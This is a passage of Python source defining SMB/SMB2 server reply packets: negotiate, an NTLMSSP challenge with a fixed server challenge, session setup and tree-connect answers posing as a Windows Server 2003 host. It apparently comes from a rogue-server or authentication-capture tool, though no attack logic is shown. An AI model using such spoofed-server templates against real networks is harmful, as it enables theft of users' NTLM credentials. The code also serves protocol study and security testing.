        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

class SMBNegoKerbAns(Packet):
    fields = OrderedDict([
        ("Wordcount",                b"\x11"),
        ("Dialect",                  b""),
        ("Securitymode",             b"\x03"),
        ("MaxMpx",                   b"\x32\x00"),
        ("MaxVc",                    b"\x01\x00"),
        ("MaxBuffSize",              b"\x04\x41\x00\x00"),
        ("MaxRawBuff",               b"\x00\x00\x01\x00"),
        ("SessionKey",               b"\x00\x00\x00\x00"),
        ("Capabilities",             b"\xfd\xf3\x01\x80"),
        ("SystemTime",               b"\x84\xd6\xfb\xa3\x01\x35\xcd\x01"),
        ("SrvTimeZone",               b"\xf0\x00"),
        ("KeyLen",                    b"\x00"),
        ("Bcc",                       b"\x57\x00"),
        ("Guid",                      b"\xc8\x27\x3d\xfb\xd4\x18\x55\x4f\xb2\x40\xaf\xd7\x61\x73\x75\x3b"),
        ("InitContextTokenASNId",     b"\x60"),
        ("InitContextTokenASNLen",    b"\x5b"),
        ("ThisMechASNId",             b"\x06"),
        ("ThisMechASNLen",            b"\x06"),
        ("ThisMechASNStr",            b"\x2b\x06\x01\x05\x05\x02"),
        ("SpNegoTokenASNId",          b"\xA0"),
        ("SpNegoTokenASNLen",         b"\x51"),
        ("NegTokenASNId",             b"\x30"),
        ("NegTokenASNLen",            b"\x4f"),
        ("NegTokenTag0ASNId",         b"\xA0"),
        ("NegTokenTag0ASNLen",        b"\x30"),
        ("NegThisMechASNId",          b"\x30"),
        ("NegThisMechASNLen",         b"\x2e"),
        ("NegThisMech1ASNId",         b"\x06"),
        ("NegThisMech1ASNLen",        b"\x09"),
        ("NegThisMech1ASNStr",        b"\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
        ("NegThisMech2ASNId",         b"\x06"),
        ("NegThisMech2ASNLen",        b"\x09"), #0a
        ("NegThisMech2ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
        ("NegThisMech3ASNId",         b"\x06"),
        ("NegThisMech3ASNLen",        b"\x0a"),
        ("NegThisMech3ASNStr",        b"\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
        ("NegThisMech4ASNId",         b"\x06"),
        ("NegThisMech4ASNLen",        b"\x09"), #0a
        ("NegThisMech4ASNStr",        b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("NegTokenTag3ASNId",         b"\xA3"),
        ("NegTokenTag3ASNLen",        b"\x1b"),
        ("NegHintASNId",              b"\x30"),
        ("NegHintASNLen",             b"\x19"),
        ("NegHintTag0ASNId",          b"\xa0"),
        ("NegHintTag0ASNLen",         b"\x17"),
        ("NegHintFinalASNId",         b"\x1b"),
        ("NegHintFinalASNLen",        b"\x15"),
        ("NegHintFinalASNStr",        b"server2008$@SMB.LOCAL"),
    ])

    def calculate(self):
        CompleteBCCLen1 =  bytes(self.fields["Guid"])+bytes(self.fields["InitContextTokenASNId"])+bytes(self.fields["InitContextTokenASNLen"])+bytes(self.fields["ThisMechASNId"])+bytes(self.fields["ThisMechASNLen"])+bytes(self.fields["ThisMechASNStr"])+bytes(self.fields["SpNegoTokenASNId"])+bytes(self.fields["SpNegoTokenASNLen"])+bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])
        AsnLenStart = bytes(self.fields["ThisMechASNId"])+bytes(self.fields["ThisMechASNLen"])+bytes(self.fields["ThisMechASNStr"])+bytes(self.fields["SpNegoTokenASNId"])+bytes(self.fields["SpNegoTokenASNLen"])+bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"]) 
        AsnLen2 = bytes(self.fields["NegTokenASNId"])+bytes(self.fields["NegTokenASNLen"])+bytes(self.fields["NegTokenTag0ASNId"])+bytes(self.fields["NegTokenTag0ASNLen"])+bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])+bytes(self.fields["NegTokenTag3ASNId"])+bytes(self.fields["NegTokenTag3ASNLen"])+bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"]) 
        MechTypeLen = bytes(self.fields["NegThisMechASNId"])+bytes(self.fields["NegThisMechASNLen"])+bytes(self.fields["NegThisMech1ASNId"])+bytes(self.fields["NegThisMech1ASNLen"])+bytes(self.fields["NegThisMech1ASNStr"])+bytes(self.fields["NegThisMech2ASNId"])+bytes(self.fields["NegThisMech2ASNLen"])+bytes(self.fields["NegThisMech2ASNStr"])+bytes(self.fields["NegThisMech3ASNId"])+bytes(self.fields["NegThisMech3ASNLen"])+bytes(self.fields["NegThisMech3ASNStr"])+bytes(self.fields["NegThisMech4ASNId"])+bytes(self.fields["NegThisMech4ASNLen"])+bytes(self.fields["NegThisMech4ASNStr"])
        Tag3Len = bytes(self.fields["NegHintASNId"])+bytes(self.fields["NegHintASNLen"])+bytes(self.fields["NegHintTag0ASNId"])+bytes(self.fields["NegHintTag0ASNLen"])+bytes(self.fields["NegHintFinalASNId"])+bytes(self.fields["NegHintFinalASNLen"])+bytes(self.fields["NegHintFinalASNStr"])

        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen1))
        self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(AsnLenStart))
        self.fields["ThisMechASNLen"] = struct.pack("<B", len(self.fields["ThisMechASNStr"]))
        self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
        self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
        self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
        self.fields["NegThisMechASNLen"] = struct.pack("<B", len(MechTypeLen)-2)
        self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech1ASNStr"])))
        self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech2ASNStr"])))
        self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech3ASNStr"])))
        self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(bytes(self.fields["NegThisMech4ASNStr"])))
        self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
        self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
        self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(self.fields["NegHintFinalASNStr"]))

class SMBSession1Data(Packet):
    fields = OrderedDict([
        ("Wordcount",             b"\x04"),
        ("AndXCommand",           b"\xff"),
        ("Reserved",              b"\x00"),
        ("Andxoffset",            b"\x5f\x01"),
        ("Action",                b"\x00\x00"),
        ("SecBlobLen",            b"\xea\x00"),
        ("Bcc",                   b"\x34\x01"),
        ("ChoiceTagASNId",        b"\xa1"),
        ("ChoiceTagASNLenOfLen",  b"\x81"),
        ("ChoiceTagASNIdLen",     b"\x00"),
        ("NegTokenTagASNId",      b"\x30"),
        ("NegTokenTagASNLenOfLen",b"\x81"),
        ("NegTokenTagASNIdLen",   b"\x00"),
        ("Tag0ASNId",             b"\xA0"),
        ("Tag0ASNIdLen",          b"\x03"),
        ("NegoStateASNId",        b"\x0A"),
        ("NegoStateASNLen",       b"\x01"),
        ("NegoStateASNValue",     b"\x01"),
        ("Tag1ASNId",             b"\xA1"),
        ("Tag1ASNIdLen",          b"\x0c"),
        ("Tag1ASNId2",            b"\x06"),
        ("Tag1ASNId2Len",         b"\x0A"),
        ("Tag1ASNId2Str",         b"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
        ("Tag2ASNId",             b"\xA2"),
        ("Tag2ASNIdLenOfLen",     b"\x81"),
        ("Tag2ASNIdLen",          b"\xED"),
        ("Tag3ASNId",             b"\x04"),
        ("Tag3ASNIdLenOfLen",     b"\x81"),
        ("Tag3ASNIdLen",          b"\xEA"),
        ("NTLMSSPSignature",      b"NTLMSSP"),
        ("NTLMSSPSignatureNull",  b"\x00"),
        ("NTLMSSPMessageType",    b"\x02\x00\x00\x00"),
        ("NTLMSSPNtWorkstationLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationMaxLen",b"\x1e\x00"),
        ("NTLMSSPNtWorkstationBuffOffset",b"\x38\x00\x00\x00"),
        ("NTLMSSPNtNegotiateFlags",b"\x15\x82\x89\xe2"),
        ("NTLMSSPNtServerChallenge",b"\x81\x22\x33\x34\x55\x46\xe7\x88"),
        ("NTLMSSPNtReserved",b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("NTLMSSPNtTargetInfoLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoMaxLen",b"\x94\x00"),
        ("NTLMSSPNtTargetInfoBuffOffset",b"\x56\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionHigh",b"\x05"),
        ("NegTokenInitSeqMechMessageVersionLow",b"\x02"),
        ("NegTokenInitSeqMechMessageVersionBuilt",b"\xce\x0e"),
        ("NegTokenInitSeqMechMessageVersionReserved",b"\x00\x00\x00"),
        ("NegTokenInitSeqMechMessageVersionNTLMType",b"\x0f"),
        ("NTLMSSPNtWorkstationName","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairsId",b"\x02\x00"),
        ("NTLMSSPNTLMChallengeAVPairsLen",b"\x0a\x00"),
        ("NTLMSSPNTLMChallengeAVPairsUnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs1Id",b"\x01\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs2Id",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs3Id",b"\x03\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3Len",b"\x1e\x00"),
        ("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs5Id",b"\x05\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5Len",b"\x04\x00"),
        ("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","SMB12"),
        ("NTLMSSPNTLMChallengeAVPairs6Id",b"\x00\x00"),
        ("NTLMSSPNTLMChallengeAVPairs6Len",b"\x00\x00"),
        ("NTLMSSPNTLMPadding",             b""),
        ("NativeOs","Windows Server 2003 3790 Service Pack 2"),
        ("NativeOsTerminator",b"\x00\x00"),
        ("NativeLAN", "Windows Server 2003 5.2"),
        ("NativeLANTerminator",b"\x00\x00"),
    ])


    def calculate(self):
        ###### Convert strings to Unicode
        self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
        self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLAN"] = self.fields["NativeLAN"].encode('utf-16le')

        ###### SecBlobLen Calc:
        AsnLen = bytes(self.fields["ChoiceTagASNId"])+bytes(self.fields["ChoiceTagASNLenOfLen"])+bytes(self.fields["ChoiceTagASNIdLen"])+bytes(self.fields["NegTokenTagASNId"])+bytes(self.fields["NegTokenTagASNLenOfLen"])+bytes(self.fields["NegTokenTagASNIdLen"])+bytes(self.fields["Tag0ASNId"])+bytes(self.fields["Tag0ASNIdLen"])+bytes(self.fields["NegoStateASNId"])+bytes(self.fields["NegoStateASNLen"])+bytes(self.fields["NegoStateASNValue"])+bytes(self.fields["Tag1ASNId"])+bytes(self.fields["Tag1ASNIdLen"])+bytes(self.fields["Tag1ASNId2"])+bytes(self.fields["Tag1ASNId2Len"])+bytes(self.fields["Tag1ASNId2Str"])+bytes(self.fields["Tag2ASNId"])+bytes(self.fields["Tag2ASNIdLenOfLen"])+bytes(self.fields["Tag2ASNIdLen"])+bytes(self.fields["Tag3ASNId"])+bytes(self.fields["Tag3ASNIdLenOfLen"])+bytes(self.fields["Tag3ASNIdLen"])
        CalculateSecBlob = bytes(self.fields["NTLMSSPSignature"])+bytes(self.fields["NTLMSSPSignatureNull"])+bytes(self.fields["NTLMSSPMessageType"])+bytes(self.fields["NTLMSSPNtWorkstationLen"])+bytes(self.fields["NTLMSSPNtWorkstationMaxLen"])+bytes(self.fields["NTLMSSPNtWorkstationBuffOffset"])+bytes(self.fields["NTLMSSPNtNegotiateFlags"])+bytes(self.fields["NTLMSSPNtServerChallenge"])+bytes(self.fields["NTLMSSPNtReserved"])+bytes(self.fields["NTLMSSPNtTargetInfoLen"])+bytes(self.fields["NTLMSSPNtTargetInfoMaxLen"])+bytes(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionLow"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+bytes(self.fields["NTLMSSPNtWorkstationName"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])
        ###### Bcc len
        BccLen = AsnLen+CalculateSecBlob+bytes(self.fields["NTLMSSPNTLMPadding"])+bytes(self.fields["NativeOs"])+bytes(self.fields["NativeOsTerminator"])+bytes(self.fields["NativeLAN"])+bytes(self.fields["NativeLANTerminator"])
        ###### SecBlobLen
        self.fields["SecBlobLen"] = struct.pack("<h", len(AsnLen+CalculateSecBlob))
        self.fields["Bcc"] = struct.pack("<h", len(BccLen))
        self.fields["ChoiceTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-3)
        self.fields["NegTokenTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-6)
        self.fields["Tag1ASNIdLen"] = struct.pack(">B", len(bytes(self.fields["Tag1ASNId2"])+bytes(self.fields["Tag1ASNId2Len"])+bytes(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag1ASNId2Len"] = struct.pack(">B", len(bytes(self.fields["Tag1ASNId2Str"])))
        self.fields["Tag2ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob+bytes(self.fields["Tag3ASNId"])+bytes(self.fields["Tag3ASNIdLenOfLen"])+bytes(self.fields["Tag3ASNIdLen"])))
        self.fields["Tag3ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob))

        ###### Andxoffset calculation.
        CalculateCompletePacket = bytes(self.fields["Wordcount"])+bytes(self.fields["AndXCommand"])+bytes(self.fields["Reserved"])+bytes(self.fields["Andxoffset"])+bytes(self.fields["Action"])+bytes(self.fields["SecBlobLen"])+bytes(self.fields["Bcc"])+BccLen
        self.fields["Andxoffset"] = struct.pack("<h", len(CalculateCompletePacket)+32)
        ###### Workstation Offset
        CalculateOffsetWorkstation = bytes(self.fields["NTLMSSPSignature"])+bytes(self.fields["NTLMSSPSignatureNull"])+bytes(self.fields["NTLMSSPMessageType"])+bytes(self.fields["NTLMSSPNtWorkstationLen"])+bytes(self.fields["NTLMSSPNtWorkstationMaxLen"])+bytes(self.fields["NTLMSSPNtWorkstationBuffOffset"])+bytes(self.fields["NTLMSSPNtNegotiateFlags"])+bytes(self.fields["NTLMSSPNtServerChallenge"])+bytes(self.fields["NTLMSSPNtReserved"])+bytes(self.fields["NTLMSSPNtTargetInfoLen"])+bytes(self.fields["NTLMSSPNtTargetInfoMaxLen"])+bytes(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionLow"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+bytes(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

        ###### AvPairs Offset
        CalculateLenAvpairs = bytes(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+bytes(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

        ##### Workstation Offset Calculation:
        self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
        self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNtWorkstationName"])))

        ##### IvPairs Offset Calculation:
        self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+bytes(self.fields["NTLMSSPNtWorkstationName"])))
        self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
        self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))

        ##### IvPair Calculation:
        self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
        self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(bytes(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

class SMBSession2Accept(Packet):
    fields = OrderedDict([
        ("Wordcount",             b"\x04"),
        ("AndXCommand",           b"\xff"),
        ("Reserved",              b"\x00"),
        ("Andxoffset",            b"\xb4\x00"),
        ("Action",                b"\x00\x00"),
        ("SecBlobLen",            b"\x09\x00"),
        ("Bcc",                   b"\x89\x01"),
        ("SSPIAccept",b"\xa1\x07\x30\x05\xa0\x03\x0a\x01\x00"),
        ("NativeOs","Windows Server 2003 3790 Service Pack 2"),
        ("NativeOsTerminator",b"\x00\x00"),
        ("NativeLAN", "Windows Server 2003 5.2"),
        ("NativeLANTerminator",b"\x00\x00"),
    ])
    def calculate(self):
        self.fields["NativeOs"] = self.fields["NativeOs"].encode('utf-16le')
        self.fields["NativeLAN"] = self.fields["NativeLAN"].encode('utf-16le')
        BccLen = bytes(self.fields["SSPIAccept"])+bytes(self.fields["NativeOs"])+bytes(self.fields["NativeOsTerminator"])+bytes(self.fields["NativeLAN"])+bytes(self.fields["NativeLANTerminator"])
        self.fields["Bcc"] = struct.pack("<h", len(BccLen))

class SMBSessEmpty(Packet):
    fields = OrderedDict([
        ("Empty",       b"\x00\x00\x00"),
    ])

class SMBTreeData(Packet):
    fields = OrderedDict([
        ("Wordcount", b"\x07"),
        ("AndXCommand", b"\xff"),
        ("Reserved",b"\x00" ),
        ("Andxoffset", b"\xbd\x00"),
        ("OptionalSupport",b"\x00\x00"),
        ("MaxShareAccessRight",b"\x00\x00\x00\x00"),
        ("GuestShareAccessRight",b"\x00\x00\x00\x00"),
        ("Bcc", b"\x94\x00"),
        ("Service", b"IPC"),
        ("ServiceTerminator",b"\x00\x00\x00\x00"),
    ])

    def calculate(self):
        ## Complete Packet Len
        CompletePacket= bytes(self.fields["Wordcount"])+bytes(self.fields["AndXCommand"])+bytes(self.fields["Reserved"])+bytes(self.fields["Andxoffset"])+bytes(self.fields["OptionalSupport"])+bytes(self.fields["MaxShareAccessRight"])+bytes(self.fields["GuestShareAccessRight"])+bytes(self.fields["Bcc"])+bytes(self.fields["Service"])+bytes(self.fields["ServiceTerminator"])
        ## AndXOffset
        self.fields["Andxoffset"] = struct.pack("<H", len(CompletePacket)+32)
        ## BCC Len Calc
        BccLen= bytes(self.fields["Service"])+bytes(self.fields["ServiceTerminator"])
        self.fields["Bcc"] = struct.pack("<H", len(BccLen))

class SMBSessTreeAns(Packet):
    fields = OrderedDict([
        ("Wordcount",       "\x03"),
        ("Command",         "\x75"),
        ("Reserved",        "\x00"),
        ("AndXoffset",      "\x4e\x00"),
        ("Action",          "\x01\x00"),
        ("Bcc",             "\x25\x00"),
        ("NativeOs",        "Windows 5.1"),
        ("NativeOsNull",    "\x00"),
        ("NativeLan",       "Windows 2000 LAN Manager"),
        ("NativeLanNull",   "\x00"),
        ("WordcountTree",   "\x03"),
        ("AndXCommand",     "\xff"),
        ("Reserved1",       "\x00"),
        ("AndxOffset",      "\x00\x00"),
        ("OptionalSupport", "\x01\x00"),
        ("Bcc2",            "\x08\x00"),
        ("Service",         "A:"),
        ("ServiceNull",     "\x00"),
        ("FileSystem",      "NTFS"),
        ("FileSystemNull",  "\x00"),
    ])

    def calculate(self):
        ## AndxOffset
        CalculateCompletePacket = str(self.fields["Wordcount"])+str(self.fields["Command"])+str(self.fields["Reserved"])+str(self.fields["AndXoffset"])+str(self.fields["Action"])+str(self.fields["Bcc"])+str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["AndXoffset"] = struct.pack("<i", len(CalculateCompletePacket)+32)[:2]
        ## BCC 1 and 2
        CompleteBCCLen =  str(self.fields["NativeOs"])+str(self.fields["NativeOsNull"])+str(self.fields["NativeLan"])+str(self.fields["NativeLanNull"])
        self.fields["Bcc"] = struct.pack("<h",len(CompleteBCCLen))
        CompleteBCC2Len = str(self.fields["Service"])+str(self.fields["ServiceNull"])+str(self.fields["FileSystem"])+str(self.fields["FileSystemNull"])
        self.fields["Bcc2"] = struct.pack("<h",len(CompleteBCC2Len))

### SMB2 Packets

class SMB2Header(Packet):
    fields = OrderedDict([
        ("Proto",         b"\xfe\x53\x4d\x42"),
        ("Len",           b"\x40\x00"),#Always 64.
        ("CreditCharge",  b"\x00\x00"),
        ("NTStatus",      b"\x00\x00\x00\x00"),
        ("Cmd",           b"\x00\x00"),
        ("Credits",       b"\x01\x00"),
        ("Flags",         b"\x01\x00\x00\x00"),
        ("NextCmd",       b"\x00\x00\x00\x00"),
        ("MessageId",     b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("PID",           b"\x00\x00\x00\x00"),
        ("TID",           b"\x00\x00\x00\x00"),
        ("SessionID",     b"\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("Signature",     b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

class SMB2NegoAns(Packet):
    fields = OrderedDict([
        ("Len",             b"\x41\x00"),
        ("Signing",         b"\x01\x00"),
        ("Dialect",         b"\xff\x02"), #10 02
        ("Reserved",        b"\x00\x00"),
        ("Guid",            b"\xee\x85\xab\xf7\xea\xf6\x0c\x4f\x92\x81\x92\x47\x6d\xeb\x76\xa9"),
        ("Capabilities",    b"\x07\x00\x00\x00"),
        ("MaxTransSize",    b"\x00\x00\x10\x00"),
        ("MaxReadSize",     b"\x00\x00\x10\x00"),
        ("MaxWriteSize",    b"\x00\x00\x10\x00"),
        ("SystemTime",      b"\x27\xfb\xea\xd7\x50\x09\xd2\x01"),
        ("BootTime",        b"\x22\xfb\x80\x01\x40\x09\xd2\x01"),
        ("SecBlobOffSet",             b"\x80\x00"),
        ("SecBlobLen",                b"\x78\x00"),
        ("Reserved2",                 b"\x00\x00\x00\x00"),
        ("InitContextTokenASNId",     b"\x60"),
        ("InitContextTokenASNLen",    b"\x76"), # 67
        ("ThisMechASNId",             b"\x06"), 
        ("ThisMechASNLen",            b"\x06"),
